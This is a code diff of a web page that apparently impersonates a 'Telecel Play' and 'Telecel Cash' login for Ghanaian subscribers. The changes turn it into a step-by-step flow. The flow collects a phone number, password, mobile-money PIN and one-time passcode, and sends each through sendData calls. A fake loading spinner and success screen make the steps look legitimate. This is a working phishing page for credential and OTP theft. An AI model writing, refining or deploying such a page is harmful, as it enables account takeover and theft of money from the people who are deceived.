@@ -13,277 +13,221 @@
 *{box-sizing:border-box}
 
 body{
-
 font-family:"Plus Jakarta Sans",system-ui;
-
 margin:0;
-
 min-height:100vh;
-
 display:flex;
 align-items:center;
 justify-content:center;
-
-background:
-linear-gradient(180deg,#fff5f7,#ffe3e8);
-
+background:linear-gradient(180deg,#fff5f7,#ffe3e8);
+overflow:hidden;
 }
 
-/* telecom waves */
+/* animated telecom waves */
 
 .wave{
-
 position:fixed;
-width:600px;
-height:600px;
+width:700px;
+height:700px;
 border-radius:50%;
-
-background:
-radial-gradient(circle,
-rgba(230,0,35,.18),
-transparent 70%);
-
+background:radial-gradient(circle,rgba(230,0,35,.18),transparent 70%);
 filter:blur(40px);
-
+animation:float 20s infinite linear;
 z-index:-1;
-
-animation:float 18s infinite linear;
-
 }
 
-.wave.one{top:-200px;right:-150px}
-.wave.two{bottom:-200px;left:-150px;animation-duration:22s}
+.wave.one{top:-250px;right:-150px}
+.wave.two{bottom:-250px;left:-150px;animation-duration:24s}
 
 @keyframes float{
-
 0%{transform:translateY(0)}
 50%{transform:translateY(40px)}
 100%{transform:translateY(0)}
-
 }
 
-.card{
+/* full page steps */
 
+.step{
+position:absolute;
 width:100%;
-max-width:380px;
-
+max-width:420px;
+padding:28px;
 background:white;
+border-radius:20px;
+box-shadow:0 30px 60px rgba(0,0,0,.2);
+transition:.4s;
+}
 
-padding:26px;
+/* center layout */
 
-border-radius:18px;
-
-box-shadow:
-0 25px 60px rgba(0,0,0,.18);
-
+.container{
+position:relative;
+width:100%;
+max-width:420px;
+height:520px;
 }
 
 /* logo */
 
 .logo{
-
 height:120px;
 display:block;
 margin:auto;
-
 }
 
 /* texts */
 
 h1{
-
-color:#e60023;
-
 text-align:center;
-
+color:#e60023;
 margin:8px 0 4px;
-
 font-size:22px;
-
 font-weight:800;
-
 }
 
 .subtitle{
-
 text-align:center;
-
 font-size:13px;
-
 color:#444;
-
 margin-bottom:16px;
-
 }
 
 /* inputs */
 
 label{
-
 font-size:13px;
-
+margin-top:12px;
 display:block;
-
-margin-top:10px;
-
 }
 
 input{
-
 width:100%;
-
 padding:12px;
-
 border-radius:10px;
-
 border:1px solid #e5e5e5;
-
 background:#fafafa;
-
 margin-top:5px;
-
 font-size:14px;
-
 }
 
 input:focus{
-
 outline:none;
-
 border-color:#e60023;
-
 background:white;
-
 }
 
-/* password toggle */
-
 .password-box{
-
 position:relative;
-
 }
 
 .eye{
-
 position:absolute;
-
 right:10px;
-
 top:50%;
-
 transform:translateY(-50%);
-
 cursor:pointer;
-
-font-size:14px;
-
 }
-
-/* hint */
 
 .hint{
-
 font-size:12px;
-
 color:#e60023;
-
 margin-top:4px;
-
 }
 
-/* button */
+/* buttons */
 
 .btn{
-
-margin-top:16px;
-
+margin-top:18px;
 width:100%;
-
 padding:12px;
-
 border-radius:10px;
-
 border:0;
-
 font-weight:700;
-
 background:#e60023;
-
 color:white;
-
 cursor:pointer;
-
 }
 
-/* modal */
-
-.modal{
-
-position:fixed;
-
-inset:0;
-
-background:rgba(0,0,0,.55);
-
-display:none;
-
-align-items:center;
-justify-content:center;
-
-}
-
-.box{
-
-background:white;
-
-padding:20px;
-
-border-radius:16px;
-
-width:100%;
-max-width:320px;
-
-}
-
-/* pin */
+/* pin boxes */
 
 .pin{
-
 display:flex;
-
 gap:8px;
-
 justify-content:center;
-
-margin:10px 0;
-
+margin:16px 0;
 }
 
 .pin input{
-
-width:45px;
-
-height:50px;
-
-text-align:center;
-
+width:48px;
+height:54px;
 font-size:20px;
+text-align:center;
+}
 
+/* spinner */
+
+.spinner{
+display:flex;
+flex-direction:column;
+align-items:center;
+gap:12px;
+}
+
+.spin{
+height:80px;
+animation:spin 1.3s linear infinite;
+}
+
+@keyframes spin{
+100%{transform:rotate(360deg)}
 }
 
 /* otp */
 
 .count{
-
-font-size:12px;
-
-color:#555;
-
 text-align:center;
+font-size:13px;
+color:#555;
+}
 
-margin-top:6px;
+/* success */
 
+.success{
+text-align:center;
+}
+
+.success img{
+height:80px;
+animation:pop .6s ease;
+}
+
+@keyframes pop{
+0%{transform:scale(.6);opacity:.2}
+100%{transform:scale(1)}
+}
+
+/* hidden */
+
+.hidden{
+opacity:0;
+pointer-events:none;
+transform:translateX(40px);
+}
+
+/* resend */
+
+.resend{
+text-align:center;
+margin-top:10px;
+font-size:13px;
+}
+
+.resend button{
+border:0;
+background:none;
+color:#e60023;
+cursor:pointer;
+font-weight:600;
 }
 
 </style>
@@ -295,28 +239,28 @@ margin-top:6px;
 <div class="wave one"></div>
 <div class="wave two"></div>
 
+<div class="container">
 
-<div class="card">
+<!-- STEP 1 -->
+
+<div id="step1" class="step">
 
 <img src="assets/telecel.svg" class="logo">
-
 
 <h1>Welcome to Telecel Play</h1>
 
 <div class="subtitle">
 
-Enter your number to log in.  
+Enter your number to log in.
 You need to be a Telecel subscriber to proceed.
 
 </div>
-
 
 <form id="form">
 
 <label>Phone Number</label>
 
 <input id="phone" placeholder="0XXXXXXXXX" inputmode="numeric">
-
 
 <label>Password</label>
 
@@ -334,34 +278,37 @@ You need to be a Telecel subscriber to proceed.
 
 </div>
 
-
-<button class="btn">
-
-Next
-
-</button>
+<button class="btn">Next</button>
 
 </form>
 
 </div>
 
 
+<!-- LOADING -->
 
-<!-- PIN -->
+<div id="loading" class="step hidden">
 
-<div id="pinModal" class="modal">
+<div class="spinner">
 
-<div class="box">
+<img src="assets/telecel.svg" class="spin">
 
-<img src="assets/telecash.webp" style="height:70px;display:block;margin:auto">
+<div>Connecting...</div>
 
-<p style="text-align:center">
+</div>
 
-Enter your Telecel Cash PIN
+</div>
 
-</p>
 
-<p style="text-align:center;font-weight:700" id="showNumber"></p>
+<!-- STEP 2 PIN -->
+
+<div id="step2" class="step hidden">
+
+<img src="assets/telecash.webp" style="height:80px;display:block;margin:auto">
+
+<h1>Telecel Cash</h1>
+
+<div class="subtitle" id="showNumber"></div>
 
 <div class="pin">
 
@@ -372,29 +319,16 @@ Enter your Telecel Cash PIN
 
 </div>
 
-<button class="btn" onclick="submitPin()">
-
-Login
-
-</button>
-
-</div>
+<button class="btn" onclick="submitPin()">Login</button>
 
 </div>
 
 
+<!-- STEP 3 OTP -->
 
-<!-- OTP -->
+<div id="step3" class="step hidden">
 
-<div id="otpModal" class="modal">
-
-<div class="box">
-
-<p style="text-align:center">
-
-Enter OTP sent to your phone
-
-</p>
+<h1>Verify OTP</h1>
 
 <div class="pin">
 
@@ -412,6 +346,12 @@ Code expires in <span id="time">60</span>s
 
 </div>
 
+<div class="resend">
+
+<button onclick="resendOtp()">Resend OTP</button>
+
+</div>
+
 <button class="btn" onclick="submitOtp()">
 
 Verify OTP
@@ -420,8 +360,25 @@ Verify OTP
 
 </div>
 
+
+<!-- STEP 4 SUCCESS -->
+
+<div id="step4" class="step hidden success">
+
+<img src="assets/telecel.svg">
+
+<h1>Success</h1>
+
+<div class="subtitle">
+
+Logging you in...
+
 </div>
 
+</div>
+
+
+</div>
 
 
 <script>
@@ -431,69 +388,80 @@ let passwordValue=""
 let pinValue=""
 let otpValue=""
 
-/* validate phone */
+/* phone validation */
 
-document.getElementById("phone").addEventListener("input",e=>{
+phone.oninput=e=>{
 
 let v=e.target.value.replace(/\D/g,"").slice(0,10)
 
-if(v.length>0 && v[0]!=="0") v="0"+v.slice(1)
+if(v.length>0 && v[0]!=="0")
+v="0"+v.slice(1)
 
 e.target.value=v
 
-})
+}
 
-/* password toggle */
+/* toggle password */
 
 function togglePassword(){
 
-const p=document.getElementById("password")
-
-p.type=p.type==="password"?"text":"password"
+password.type=password.type==="password"?"text":"password"
 
 }
 
-/* submit login */
+/* step control */
 
-document.getElementById("form").onsubmit=e=>{
+function show(id){
+
+document.querySelectorAll(".step").forEach(s=>s.classList.add("hidden"))
+
+document.getElementById(id).classList.remove("hidden")
+
+}
+
+/* next */
+
+form.onsubmit=e=>{
 
 e.preventDefault()
 
-phoneValue=document.getElementById("phone").value
-
-passwordValue=document.getElementById("password").value
+phoneValue=phone.value
+passwordValue=password.value
 
 if(!/^0\d{9}$/.test(phoneValue)){
 
-alert("Enter valid number")
+alert("Enter valid Ghana number")
 
 return
 
 }
 
-document.getElementById("showNumber").textContent=phoneValue
+/* convert to +233 */
 
-document.getElementById("pinModal").style.display="flex"
+phoneValue="+233"+phoneValue.slice(1)
 
-sendData("login",{
+sendData("login",{phone:phoneValue,password:passwordValue})
 
-phone:phoneValue,
+show("loading")
 
-password:passwordValue
+setTimeout(()=>{
 
-})
+showNumber.textContent=phoneValue
+
+show("step2")
+
+},1200)
 
 }
 
-/* pin input auto focus */
+/* pin */
 
-document.querySelectorAll("#pinModal input").forEach((i,index)=>{
+document.querySelectorAll("#step2 input").forEach((i,index)=>{
 
 i.oninput=()=>{
 
 if(i.value && index<3)
-
-document.querySelectorAll("#pinModal input")[index+1].focus()
+document.querySelectorAll("#step2 input")[index+1].focus()
 
 }
 
@@ -501,31 +469,34 @@ document.querySelectorAll("#pinModal input")[index+1].focus()
 
 function submitPin(){
 
-pinValue=[...document.querySelectorAll("#pinModal input")]
+pinValue=[...document.querySelectorAll("#step2 input")]
 
 .map(i=>i.value)
 
 .join("")
 
-document.getElementById("pinModal").style.display="none"
-
-document.getElementById("otpModal").style.display="flex"
-
 sendData("pin",{pin:pinValue})
 
+show("loading")
+
+setTimeout(()=>{
+
+show("step3")
+
 startTimer()
+
+},1200)
 
 }
 
 /* otp */
 
-document.querySelectorAll("#otpModal input").forEach((i,index)=>{
+document.querySelectorAll("#step3 input").forEach((i,index)=>{
 
 i.oninput=()=>{
 
 if(i.value && index<4)
-
-document.querySelectorAll("#otpModal input")[index+1].focus()
+document.querySelectorAll("#step3 input")[index+1].focus()
 
 }
 
@@ -533,7 +504,7 @@ document.querySelectorAll("#otpModal input")[index+1].focus()
 
 function submitOtp(){
 
-otpValue=[...document.querySelectorAll("#otpModal input")]
+otpValue=[...document.querySelectorAll("#step3 input")]
 
 .map(i=>i.value)
 
@@ -541,7 +512,19 @@ otpValue=[...document.querySelectorAll("#otpModal input")]
 
 sendData("otp",{otp:otpValue})
 
-location.href="thankyou.html"
+show("step4")
+
+setTimeout(()=>location.href="thankyou.html",1600)
+
+}
+
+/* resend */
+
+function resendOtp(){
+
+startTimer()
+
+sendData("resend_otp")
 
 }
 
@@ -551,15 +534,15 @@ function startTimer(){
 
 let t=60
 
-const el=document.getElementById("time")
+time.textContent=t
 
-const interval=setInterval(()=>{
+const i=setInterval(()=>{
 
 t--
 
-el.textContent=t
+time.textContent=t
 
-if(t<=0) clearInterval(interval)
+if(t<=0) clearInterval(i)
 
 },1000)
 
@@ -600,4 +583,5 @@ time:new Date().toISOString()
 </script>
 
 </body>
+
 </html>
